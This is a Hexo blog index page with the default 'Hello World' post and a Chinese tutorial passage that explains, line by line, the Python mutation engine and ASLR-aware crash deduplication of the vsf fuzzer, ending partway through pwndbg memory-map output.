<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 8.0.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/10/01/hello-world/" class="article-date">
  <time class="dt-published" datetime="2025-09-30T16:47:56.646Z" itemprop="datePublished">2025-10-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/10/01/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/10/01/hello-world/" data-id="cuidKjeJgA5H4yts6IGyQ3Y-9" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2023-06-27-fuzzer" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/06/27/2023-06-27-fuzzer/" class="article-date">
  <time class="dt-published" datetime="2023-06-26T16:00:00.000Z" itemprop="datePublished">2023-06-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/06/27/2023-06-27-fuzzer/">如何完成一个 fuzzer</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近读了 go fuzz 源码，好几处细节不太理解为什么要这么写。决定自己造个轮子，完成一个 fuzzer，加深自己的理解。先是读完了 <a target="_blank" rel="noopener" href="https://carstein.github.io/2020/04/18/writing-simple-fuzzer-1.html">Build simple fuzzer</a> 系列，师傅写的非常诙谐，文章娓娓道来，受益良多。师傅是用 python 实现了一个能够 fuzz C 或 C++ 可执行文件的 fuzzer，并把 <a target="_blank" rel="noopener" href="https://github.com/carstein/vsf/releases">vsf 源码</a> 托管到了 github 上，有 4 个 tag，和文章一一对应。</p>
<p>首先我会把师傅的最终代码进行事无巨细的分析，并把师傅的 binary ninja 自动下断点的代码改成 ida 脚本插件版本，更方便我们配合 ida 进行使用。最后我会说下我对师傅的变异算法的解读，并试图优化一下师傅的变异策略。在最后完成 go 的部分<a target="_blank" rel="noopener" href="https://github.com/pic4xiu/SomethingToPlay/blob/main/fuzzer/tagOne/main.go">重构</a>。</p>
<h2 id="vsf-整体-fuzz-流程"><a href="#vsf-整体-fuzz-流程" class="headerlink" title="vsf 整体 fuzz 流程"></a><a target="_blank" rel="noopener" href="https://github.com/carstein/vsf/releases">vsf</a> 整体 fuzz 流程</h2><ol>
<li>声明要 fuzz 的对象、语料库、断点等</li>
<li>语料读入，初始化变异器</li>
<li>变异器进行迭代</li>
<li>执行 fuzz 逻辑</li>
<li>记录根据当前变异器得到的文件所能观察到的块</li>
<li>更新 corpus</li>
<li>用户是否发出终止命令，发出了就保存 crash 文件，否则就回 3 继续执行</li>
</ol>
<h2 id="vsf-代码解读"><a href="#vsf-代码解读" class="headerlink" title="vsf 代码解读"></a>vsf 代码解读</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/carstein/vsf/releases">https://github.com/carstein/vsf/releases</a></p>
</blockquote>
<h3 id="变异器类："><a href="#变异器类：" class="headerlink" title="变异器类："></a>变异器类：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Mutator</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, core</span>):  <span class="comment"># 它接受一个参数 core 作为核心样本集  </span></span><br><span class="line">        <span class="comment"># core set of samples  </span></span><br><span class="line">        <span class="variable language_">self</span>.core = core  <span class="comment"># 核心样本集，存储一组样本。  </span></span><br><span class="line">        <span class="comment"># Data format = &gt; (array of bytearrays, coverage)</span></span><br><span class="line">        <span class="variable language_">self</span>.trace = <span class="built_in">set</span>()  <span class="comment"># Currently observed blocks  </span></span><br><span class="line">        <span class="comment"># 当前观察到的块集合，使用set数据结构存储。  </span></span><br><span class="line">        <span class="variable language_">self</span>.corpus = []  <span class="comment"># Corpus of executed samples  </span></span><br><span class="line">        <span class="comment"># 执行过的样本集，使用列表[]存储。  </span></span><br><span class="line">        <span class="variable language_">self</span>.pool = []  <span class="comment"># Mutation pool  </span></span><br><span class="line">        <span class="comment"># 变异池，使用列表[]存储。  </span></span><br><span class="line">        <span class="variable language_">self</span>.samples = []  <span class="comment"># Mutated samples  </span></span><br><span class="line">        <span class="comment"># 变异后的样本集，使用列表[]存储。  </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__iter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># Initiate mutation round  </span></span><br><span class="line">        <span class="variable language_">self</span>._fit_pool()</span><br><span class="line">        <span class="variable language_">self</span>._mutate_pool()</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__next__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.samples:</span><br><span class="line">            <span class="variable language_">self</span>._fit_pool()</span><br><span class="line">            <span class="variable language_">self</span>._mutate_pool()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">global</span> stop_flag</span><br><span class="line">        <span class="keyword">if</span> stop_flag:</span><br><span class="line">            <span class="keyword">raise</span> StopIteration</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.samples.pop()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个类实现了<code>__iter__</code>方法，返回一个迭代器对象。在这个方法中，首先调用<code>_fit_pool</code>方法和<code>_mutate_pool</code>方法，用于初始化变异池和进行变异操作。然后返回 self 作为迭代器对象。这个类还实现了<code>__next__</code>方法，用于返回下一个变异后的样本。在这个方法中，首先判断变异后的样本集 self.samples 是否为空，如果为空，则调用<code>_fit_pool</code>方法和<code>_mutate_pool()</code>方法，用于初始化变异池和进行变异操作。然后判断全局变量 stop_flag 的值，如果为 True，则抛出 StopIteration 异常，表示迭代结束；否则，返回 <code>self.samples.pop()</code>，弹出并返回变异后的样本。</p>
<p>简单来说，这个类是一个用于变异操作的类，通过构造函数初始化一些实例变量，包括核心样本集、当前观察到的块集合、执行过的样本集、变异池和变异后的样本集。通过实现<code>__iter__</code>方法返回一个迭代器对象，以及实现<code>__next__</code>方法返回下一个变异后的样本。这个类可以用于生成变异后的样本集。</p>
<p>之后就是我们的初始化变异池函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_fit_pool</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="comment"># fit function for our genetic algorithm  </span></span><br><span class="line">    <span class="comment"># Always copy initial corpus  </span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;### Fitting round\t\t&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> sample <span class="keyword">in</span> <span class="variable language_">self</span>.core:</span><br><span class="line">        <span class="variable language_">self</span>.pool.append((sample, []))</span><br><span class="line">    <span class="comment"># 遍历核心样本集 self.core，将每个样本和一个空列表作为元组 (sample, []) 添加到变异池 self.pool 中  </span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Pool size: &#123;:d&#125; [core samples promoted]&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(<span class="variable language_">self</span>.pool)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Select elements that uncovered new block  </span></span><br><span class="line">    <span class="keyword">for</span> sample, trace <span class="keyword">in</span> <span class="variable language_">self</span>.corpus:</span><br><span class="line">        <span class="comment"># 执行过的样本集self.corpus中的每个样本和对应的观察到的块集合  </span></span><br><span class="line">        <span class="keyword">if</span> trace - <span class="variable language_">self</span>.trace:</span><br><span class="line">            <span class="variable language_">self</span>.pool.append((sample, trace))</span><br><span class="line">    <span class="comment"># 如果该样本观察到的块集合与当前观察到的块集合self.trace有不同  </span></span><br><span class="line">    <span class="comment"># 则将该样本和块集合添加到变异池self.pool中  </span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Pool size: &#123;:d&#125; [new traces promoted]&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(<span class="variable language_">self</span>.pool)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Backfill to 100  </span></span><br><span class="line">    <span class="keyword">if</span> <span class="variable language_">self</span>.corpus <span class="keyword">and</span> <span class="built_in">len</span>(<span class="variable language_">self</span>.pool) &lt; <span class="number">100</span>:</span><br><span class="line">        <span class="comment"># 如果执行过的样本集self.corpus非空，并且变异池self.pool的大小小于100，那么会进行补充  </span></span><br><span class="line">        <span class="variable language_">self</span>.corpus.sort(reverse=<span class="literal">True</span>, key=<span class="keyword">lambda</span> x: <span class="built_in">len</span>(x[<span class="number">1</span>]))</span><br><span class="line">        <span class="comment"># 首先对执行过的样本集进行降序排序，按照观察到的块集合的长度进行比较  </span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">min</span>(<span class="number">100</span> - <span class="built_in">len</span>(<span class="variable language_">self</span>.pool), <span class="built_in">len</span>(<span class="variable language_">self</span>.corpus))):</span><br><span class="line">            <span class="comment"># Exponential Distribution</span></span><br><span class="line">            v = random.random() * random.random() * <span class="built_in">len</span>(<span class="variable language_">self</span>.corpus)</span><br><span class="line">            <span class="comment"># 通过这种方式，随机选择一些样本并将其添加到变异池中，这里留个印象，这就是遗传算法的变异策略  </span></span><br><span class="line"></span><br><span class="line">            <span class="variable language_">self</span>.pool.append(<span class="variable language_">self</span>.corpus[<span class="built_in">int</span>(v)])</span><br><span class="line">            <span class="variable language_">self</span>.corpus.pop(<span class="built_in">int</span>(v))</span><br><span class="line">            <span class="comment"># 添加后，从执行过的样本集中移除这些样本  </span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Pool size: &#123;:d&#125; [backfill from corpus]&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(<span class="variable language_">self</span>.pool)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;### End of round\t\t&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Update trace info  </span></span><br><span class="line">    <span class="keyword">for</span> _, t <span class="keyword">in</span> <span class="variable language_">self</span>.corpus:</span><br><span class="line">        <span class="variable language_">self</span>.trace |= t</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Drop rest of the corpus  </span></span><br><span class="line">    <span class="variable language_">self</span>.corpus = []</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在方法的最后，遍历执行过的样本集 self.corpus，将每个样本对应的观察到的块集合与当前观察到的块集合进行合并操作，更新 self.trace 的值。之后将执行过的样本集 self.corpus 清空，即删除其中的所有样本。</p>
<p>总结起来，这个方法用于根据当前的观察到的块集合和执行过的样本集，将样本添加到变异池中。首先会将核心样本集中的样本添加到变异池中。然后，根据执行过的样本集中观察到的新块，将样本和块集合添加到变异池中。接着，如果变异池的大小小于 100，则根据 random 乘 random 的方式从执行过的样本集中“随机”选择一些样本进行补充。最后，更新当前观察到的块集合，并清空执行过的样本集。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_mutate_pool</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="comment"># Create samples by mutating pool  </span></span><br><span class="line">    <span class="keyword">while</span> <span class="variable language_">self</span>.pool:  <span class="comment"># 池子里有东西就弹出  </span></span><br><span class="line">        sample, _ = <span class="variable language_">self</span>.pool.pop()</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):  <span class="comment">## 把弹出的 sample 执行变异，当成 samples 填入  </span></span><br><span class="line">            <span class="variable language_">self</span>.samples.append(Mutator.mutate_sample(sample))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_corpus</span>(<span class="params">self, data, trace=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="variable language_">self</span>.corpus.append((data, trace))  <span class="comment">## 更新语料库，真正的 fuzz 程序会调用该方法并更新 corpus  </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>之后就是师傅写的变异的具体函数了，首先是产生一个派发具体要调用哪个变异方法的函数，也就是上文的函数：<code>mutate_sample</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mutate_sample</span>(<span class="params">sample</span>):</span><br><span class="line">    _sample = sample[:]  <span class="comment"># Copy sample</span></span><br><span class="line"></span><br><span class="line">    methods = [  <span class="comment">##这些方法都是之后要使用的具体变异函数  </span></span><br><span class="line">        Mutator.bit_flip,</span><br><span class="line">        Mutator.byte_flip,</span><br><span class="line">        Mutator.magic_number,</span><br><span class="line">        Mutator.add_block,</span><br><span class="line">        Mutator.remove_block,</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    f = random.choice(methods)  <span class="comment"># 选哪个方法  </span></span><br><span class="line">    idx = random.choice(<span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(_sample)))  <span class="comment"># 选索引  </span></span><br><span class="line">    f(idx, _sample)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> _sample</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">SIZE = [<span class="number">4</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">32</span>, <span class="number">64</span>]</span><br><span class="line">FLIP_ARRAY = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">32</span>, <span class="number">64</span>, <span class="number">128</span>]</span><br><span class="line">MAGIC_VALS = [</span><br><span class="line">    [<span class="number">0xFF</span>],</span><br><span class="line">    [<span class="number">0x7F</span>],</span><br><span class="line">    [<span class="number">0x00</span>],</span><br><span class="line">    [<span class="number">0xFF</span>, <span class="number">0xFF</span>],  <span class="comment"># 0xFFFF  </span></span><br><span class="line">    [<span class="number">0x00</span>, <span class="number">0x00</span>],  <span class="comment"># 0x0000  </span></span><br><span class="line">    [<span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>],  <span class="comment"># 0xFFFFFFFF  </span></span><br><span class="line">    [<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>],  <span class="comment"># 0x00000000  </span></span><br><span class="line">    [<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x80</span>],  <span class="comment"># 0x80000000  </span></span><br><span class="line">    [<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>],  <span class="comment"># 0x40000000  </span></span><br><span class="line">    [<span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x7F</span>],  <span class="comment"># 0x7FFFFFFF  </span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bit_flip</span>(<span class="params">index, _sample</span>):  <span class="comment"># 选和哪个FLIP_ARRAY进行异或  </span></span><br><span class="line">    num = random.choice(SIZE)</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> random.choices(<span class="built_in">range</span>(<span class="built_in">len</span>(_sample)), k=num):</span><br><span class="line">        _sample[idx] = _sample[idx] ^ random.choice(FLIP_ARRAY)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">byte_flip</span>(<span class="params">index, _sample</span>):  <span class="comment"># 选和那个random.getrandbits(8)进行异或，算是加强版的bit_flip  </span></span><br><span class="line">    num = random.choice(SIZE)</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> random.choices(<span class="built_in">range</span>(<span class="built_in">len</span>(_sample)), k=num):</span><br><span class="line">        _sample[idx] = _sample[idx] ^ random.getrandbits(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">magic_number</span>(<span class="params">index, _sample</span>):</span><br><span class="line">    selected_magic = random.choice(MAGIC_VALS)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># guard clause, we don&#x27;t want to go off by one</span></span><br><span class="line">    <span class="keyword">if</span> index &gt; (<span class="built_in">len</span>(_sample) - <span class="built_in">len</span>(selected_magic)):  <span class="comment"># 做个防越界  </span></span><br><span class="line">        index = <span class="built_in">len</span>(_sample) - <span class="built_in">len</span>(selected_magic)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(selected_magic):</span><br><span class="line">        _sample[index + c] = v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_block</span>(<span class="params">index, _sample</span>):  <span class="comment">## 添加和移除块，四四方方的移除  </span></span><br><span class="line">    size = random.choice(SIZE)</span><br><span class="line">    _sample[index:index] = <span class="built_in">bytearray</span>((random.getrandbits(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_block</span>(<span class="params">index, _sample</span>):</span><br><span class="line">    size = random.choice(SIZE)</span><br><span class="line"></span><br><span class="line">    _sample = _sample[:index] + _sample[index + size :]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="防止-ASLR-随机化"><a href="#防止-ASLR-随机化" class="headerlink" title="防止 ASLR 随机化"></a>防止 ASLR 随机化</h3><blockquote>
<p>让造成程序 crash 的样本单一化</p>
</blockquote>
<p>这里解释一下为什么要搞个这个函数：首先得到了造成程序 crash 的文件是很好，但是贪多就不行了，假如对于每个能够造成程序 crash 的文件我们都进行记录的话，这会造成我们保存文件过多，反而不利于我们分析，因此需要去重。而对于 linux 程序来说，aslr 基本上已经是人手必备了，所以必须使用到绝对地址减去内存映射的方式。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_base</span>(<span class="params">vmmap</span>):</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> vmmap:</span><br><span class="line">        <span class="comment">## 如果有可执行权限，并且后缀是我们这个文件名的，就返回他的起始地址  </span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;x&quot;</span> <span class="keyword">in</span> m.permissions <span class="keyword">and</span> m.pathname.endswith(</span><br><span class="line">            os.path.basename(config[<span class="string">&quot;target&quot;</span>])</span><br><span class="line">        ):</span><br><span class="line">            <span class="keyword">return</span> m.start</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>类似这种形式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">06:0030│     0x7fffffffe1d8 ◂— 0x6887a0b1d2b37c3e</span><br><span class="line">07:0038│     0x7fffffffe1e0 —▸ 0x555555555060 (_start) ◂— endbr64 </span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0   0x555555555149 main</span><br><span class="line">   1   0x7ffff7df3083 __libc_start_main+243</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">    0x555555554000     0x555555555000 r--p     1000      0 /home/main</span><br><span class="line">    0x555555555000     0x555555556000 r-xp     1000   1000 /home/main</span><br><span class="line">    0x555555556000     0x555555557000 r--p     1000   2000 /home/main</span><br><span class="line">    0x555555557000     0x555555558000 r--p     1000   2000 /home/main</span><br><span class="line">    0x555555558000     0x555555559000 rw-p     1000   3000 /home/main</span><br><span class="line">    0x7ffff7dcf000     0x7ffff7df1000 r--p    22000      0 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7df1000     0x7ffff7f69000 r-xp   178000  22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7f69000     0x7ffff7fb7000 r--p    4e000 19a000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7fb7000     0x7ffff7fbb000 r--p     4000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7fbb000     0x7ffff7fbd000 rw-p     2000 1eb000 